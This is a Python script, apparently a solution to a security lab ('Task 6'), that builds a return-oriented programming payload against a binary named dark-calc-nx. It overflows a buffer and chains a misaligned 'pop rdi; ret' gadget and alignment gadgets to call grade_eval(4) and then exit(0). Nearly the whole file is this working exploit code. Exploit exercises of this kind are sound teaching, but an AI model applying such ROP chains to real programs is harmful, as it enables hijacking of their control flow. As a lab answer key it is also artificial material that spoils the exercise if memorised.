#!/usr/bin/env python3
"""Task 6: ROP —— 为 attack/dark-calc-nx 生成 payload。

pop rdi; ret 来自 __libc_csu_init 尾部 41 5f c3 的错位入口 0x401a33；
两条 0x401636 的 ret 用来把 grade_eval 和 exit 的入口对齐到 8 mod 16。
"""
import struct
import sys


def p64(v):
    return struct.pack("<Q", v)


payload = (
    b"A" * 16
    + b"B" * 8
    + p64(0x401A33)      # pop rdi; ret
    + p64(4)             # rdi = 4
    + p64(0x401636)      # ret，对齐
    + p64(0x401978)      # grade_eval
    + p64(0x401636)      # ret，再次对齐
    + p64(0x401A33)      # pop rdi; ret
    + p64(0)             # rdi = 0
    + p64(0x4016E0)      # exit@plt
)

assert len(payload) == 88

sys.stdout.buffer.write(payload)
